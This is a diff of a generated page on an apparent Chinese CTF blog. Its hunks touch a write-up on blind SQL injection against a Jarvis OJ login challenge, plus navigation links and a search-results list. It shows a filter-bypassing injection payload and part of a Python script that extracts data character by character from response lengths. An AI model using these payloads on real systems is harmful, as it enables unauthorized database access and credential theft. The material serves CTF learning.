@@ -285,11 +285,11 @@ payload3: username=admin'/**/and/**/length((select/**/group_concat(distinct/**/c
 上面的代码稍微改改，获取字段内容：
 </code></pre>
 
-<p><br></p>
+<p><br>
+    <!-- tab python -->
+    import requests</p>
 
-<pre><code>import requests
-
-if __name__ == '__main__':
+<pre><code>if __name__ == '__main__':
     url = 'http://web.jarvisoj.com:32787/login.php'
     # username = &quot;admin'/**/and/**/length((select/**/group_concat(distinct/**/table_name)/**/from/**/information_schema.columns/**/where/**/table_schema=database()))=5#&quot;
     for i in range(20):
@@ -306,6 +306,7 @@ if __name__ == '__main__':
             if len(html.text)==1191:  # 密码错误时响应内容长度为1191
                 print(chr(num), end='')
                 break
+&lt;!-- endtab --&gt;
 </code></pre>
 
 <p><br>
@@ -372,7 +373,7 @@ username中也就一个admin用户），不过现在这个md5好像成为付费�
           
             <li class="post-action">
               
-                <a class="post-action-btn btn btn--disabled">
+                <a class="post-action-btn btn btn--default tooltip--top" href="/2018/10/pwntools/" data-tooltip="Pwntools">
               
                   <i class="fa fa-angle-left"></i>
                   <span class="hide-xs hide-sm text-small icon-ml">下一篇</span>
@@ -440,7 +441,7 @@ username中也就一个admin用户），不过现在这个md5好像成为付费�
           
             <li class="post-action">
               
-                <a class="post-action-btn btn btn--disabled">
+                <a class="post-action-btn btn btn--default tooltip--top" href="/2018/10/pwntools/" data-tooltip="Pwntools">
               
                   <i class="fa fa-angle-left"></i>
                   <span class="hide-xs hide-sm text-small icon-ml">下一篇</span>
@@ -535,6 +536,42 @@ username中也就一个admin用户），不过现在这个md5好像成为付费�
       <div class="no-result text-color-light text-center"></div>
       <div class="results">
         
+        
+          <div class="media">
+            
+            <div class="media-body">
+              <a class="link-unstyled" href="/2018/10/base64%E9%9A%90%E5%86%99/">
+                <h3 class="media-heading">Base64隐写</h3>
+              </a>
+              <span class="media-meta">
+                <span class="media-date text-small">
+                  Oct 10, 2018
+                </span>
+              </span>
+              <div class="media-content hide-xs font-merryweather"><p>你真的理解base64吗。
+    </p></div>
+            </div>
+            <div style="clear:both;"></div>
+            <hr>
+          </div>
+        
+          <div class="media">
+            
+            <div class="media-body">
+              <a class="link-unstyled" href="/2018/10/pwntools/">
+                <h3 class="media-heading">Pwntools</h3>
+              </a>
+              <span class="media-meta">
+                <span class="media-date text-small">
+                  Oct 10, 2018
+                </span>
+              </span>
+              <div class="media-content hide-xs font-merryweather"><p>官方文档：<a href="http://docs.pwntools.com">http://docs.pwntools.com</a>
+    </p></div>
+            </div>
+            <div style="clear:both;"></div>
+            <hr>
+          </div>
         
           <div class="media">
             
@@ -684,7 +721,7 @@ username中也就一个admin用户），不过现在这个md5好像成为付费�
          data-message-zero=""
          data-message-one=""
          data-message-other="">
-         7 posts found
+         9 posts found
       </p>
     </div>
   </div>
